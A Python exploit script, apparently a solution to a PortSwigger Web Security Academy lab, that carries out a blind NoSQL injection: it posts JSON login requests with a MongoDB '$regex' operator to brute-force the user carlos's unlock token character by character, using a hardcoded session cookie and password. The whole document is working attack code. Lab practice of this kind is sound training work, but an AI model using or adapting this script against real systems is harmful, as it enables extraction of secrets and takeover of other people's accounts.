import string
import requests
from pwn import *

class Exploit:

    def __init__(self):

        self.host = "https://0a2500dc0409d47a9664c3b8007e00ef.web-security-academy.net"
        self.api = "/login"
        self.characters = string.ascii_letters + string.digits
        self.headers = {"Cookie":"session=OBTzwJsz7iAuHv5AVE6u8uHD9vDQZJLw", "Content-Type":"application/json"}
        self.p2 = log.progress("Payload")
        self.p1 = log.progress("NOSQL Injection")

    def nosqli(self):

        # paramaters: id, username, password, email, unlockToken
        content = ""
        pos = 0
        while True:
            self.p1.status(content)

            for char in self.characters:

                #payload = {"username":"carlos", "password":{"$regex":f"^{content+char}"}}
                payload = {"username":"carlos", "password":"05zy78qvmwhaukzdfa2a", "unlockToken": {"$regex":f"^{content}{char}"}}
                self.p2.status(payload)
            
                r = requests.post(self.host+self.api, headers=self.headers, json=payload)
                if "Invalid username or password" not in r.text:
                    content+=char
                    pos+=1
                    break


if __name__ == "__main__":

    exploit = Exploit()
    exploit.nosqli()


        